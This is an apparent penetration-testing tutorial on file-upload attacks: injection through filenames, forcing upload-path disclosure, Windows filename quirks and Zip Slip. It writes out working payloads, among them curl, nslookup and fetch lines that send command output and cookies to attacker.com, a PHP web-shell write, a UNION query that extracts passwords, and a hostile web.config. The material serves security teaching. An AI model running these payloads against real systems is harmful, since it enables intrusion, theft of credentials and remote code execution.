## Other File Upload Attacks

Beyond the standard filter bypass and limited file upload techniques, the filename field itself, the upload response behaviour, and Windows filesystem quirks each open independent attack surfaces that do not require the uploaded file to execute at all.

***

## Filename Injection Attacks

The filename in the `Content-Disposition` header is user-controlled input like any other. If the application passes this value unsanitised to an OS command, SQL query, or renders it in HTML without escaping, it becomes an injection point that is completely separate from the file content. 

### Command Injection via Filename

When the application uses the filename in an OS command (moving, copying, renaming, or indexing the file), shell metacharacters in the filename cause additional commands to execute:

```
# Semicolon injection
file;whoami.jpg

# Subshell injection
file$(whoami).jpg
file`whoami`.jpg

# OR operator injection (executes if main command fails)
file.jpg||whoami

# Pipe injection
file.jpg|id

# Blind injection with time delay (confirms execution without output)
file;sleep+5;.jpg
```

In Burp, set the filename field to these payloads one at a time:

```http
Content-Disposition: form-data; name="uploadFile"; filename="file$(whoami).jpg"
```

If the server takes 5 extra seconds to respond to the sleep payload, command injection is confirmed even with no visible output.  From there, use out-of-band techniques to extract data: 

```bash
# DNS exfiltration (works even with firewalled HTTP)
file$(curl+attacker.com/$(whoami)).jpg
file$(nslookup+$(whoami).attacker.com).jpg

# File write to confirm execution
file;echo+'<?php+system($_GET[cmd]);?>'+>+/var/www/html/shell.php;.jpg
```

### XSS via Filename

If the application displays the filename anywhere in its interface (file manager, upload confirmation, admin panel, error messages), inject HTML or JavaScript:

```
<script>alert(document.cookie)</script>.jpg
"><img src=1 onerror=alert(1)>.jpg
"><svg/onload=fetch('https://attacker.com/?c='+document.cookie)>.jpg
```

This becomes stored XSS if other users see the filename, or reflected XSS if only the uploader sees it immediately. 

### SQL Injection via Filename

If the application stores the filename in a database and the query is not parameterised:

```sql
-- Time-based blind injection to confirm vulnerability
file';SELECT SLEEP(5);--.jpg

-- UNION-based extraction
file' UNION SELECT username,password FROM users;--.jpg

-- Boolean-based
file' AND '1'='1.jpg
```

***

## Upload Directory Disclosure

When the application does not return the upload path in the response, several techniques force it to reveal the location through error messages.

### Duplicate Filename Collision

Most web servers throw an error when a file cannot be written because it already exists at the destination. Upload the same file twice in quick succession, or upload a file with a name that commonly already exists:

```bash
# Upload the same file twice to trigger a write collision error
# The error message often includes the full filesystem path:
# "File /var/www/html/uploads/shell.php already exists"
```

### Overly Long Filename

Many filesystems (ext4, NTFS) have a 255-character limit for filenames. Exceeding this causes an OS-level error that propagates up through the application:

```python
import requests

long_name = "A" * 5000 + ".jpg"

files = {'uploadFile': (long_name, open('image.jpg', 'rb'), 'image/jpeg')}
r = requests.post('http://target.com/upload.php', files=files)
print(r.text)  # Error may contain upload directory path
```

### Error-Forced Disclosure

Other approaches that trigger revealing errors:

```
# Invalid characters in filename (may trigger OS-level errors)
/var/www/html/uploads/file.jpg
../../etc/test.jpg         # Path traversal attempt reveals handling logic
%00test.jpg                # Null byte may cause file function errors
file<>.jpg                 # Invalid characters for Windows paths
```

***

## Windows-Specific Attacks

### Reserved Device Names

Windows cannot create files with device names regardless of extension. Any application running on IIS that attempts to write a file with one of these names gets a system-level error that may expose the upload path or cause a DoS: 

```
COM1.jpg  COM2.jpg  COM3.jpg  COM4.jpg
LPT1.jpg  LPT2.jpg  LPT3.jpg  LPT4.jpg
CON.jpg   PRN.jpg   AUX.jpg   NUL.jpg
```

Windows treats `NUL` identically to `/dev/null`, so uploading `NUL.php` may cause the application to silently discard the file while still processing the rest of the request, which can be useful for testing logic without actually writing anything.

### Invalid Characters

Windows reserves specific characters that cause filesystem errors when used in filenames. These may trigger errors that disclose the upload path or cause unexpected application behaviour:

```
file|name.jpg    # Pipe
file<name.jpg    # Less than
file>name.jpg    # Greater than
file*name.jpg    # Wildcard
file?name.jpg    # Wildcard
file"name.jpg    # Quote
```

### 8.3 Short Filename Convention

[Windows 8.3 filename convention](https://en.wikipedia.org/wiki/8.3_filename) automatically generates a short alias for every long filename. The pattern is the first six characters of the name followed by `~N` where N is the order among files with the same prefix. 

```
hackthebox.txt   →  HACKTH~1.TXT
webshell.php     →  WEBSHE~1.PHP
config.php       →  CONFIG~1.PHP
web.config       →  WEB~1.CON
```

This enables two attacks:

**File access bypass:** If an application blocks access to `web.config` by exact name, requesting `WEB~1.CON` may bypass the check because the application only blocks the full name.

**File overwrite:** If you can upload a file, naming it with the 8.3 equivalent of a sensitive existing file may overwrite it. Uploading `WEB~1.CON` could overwrite `web.config`, disrupting the application or injecting malicious configuration:

```xml
<!-- Malicious web.config for IIS to execute .jpg as ASP -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="asphandler" path="*.jpg" verb="*" 
                 modules="IsapiModule" 
                 scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"/>
        </handlers>
    </system.webServer>
</configuration>
```

***

## Advanced Processing Vulnerabilities

Any automatic file processing the server performs after upload is a potential vulnerability surface, regardless of what the file type is.

| Processing Action | Potential Vulnerability | Example |
|------------------|------------------------|---------|
| Video transcoding | XXE/SSRF via metadata | [ffmpeg AVI XXE via HLS playlist injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/README.md) |
| Image resizing | Pixel flood DoS, ImageMagick RCE (ImageTragick) | CVE-2016-3714 |
| Archive extraction | Decompression bomb, path traversal via symlink | Zip slip via `../../../etc/cron.d/shell` |
| PDF rendering | SSRF, XXE, JavaScript execution | PhantomJS SSRF |
| Document conversion | Macro execution, XXE | LibreOffice macro RCE |
| Antivirus scanning | EICAR test string handling errors | Processing errors revealing paths |

The [Zip Slip vulnerability](https://github.com/snyk/zip-slip-vulnerability) is a particularly impactful example: a ZIP archive containing a file with a path traversal name like `../../etc/cron.d/backdoor` causes the extraction library to write outside the intended directory, planting files anywhere the web process has write access.  This works through any upload form that accepts ZIP files and automatically extracts them, regardless of how strong the extension or content type validation is. 
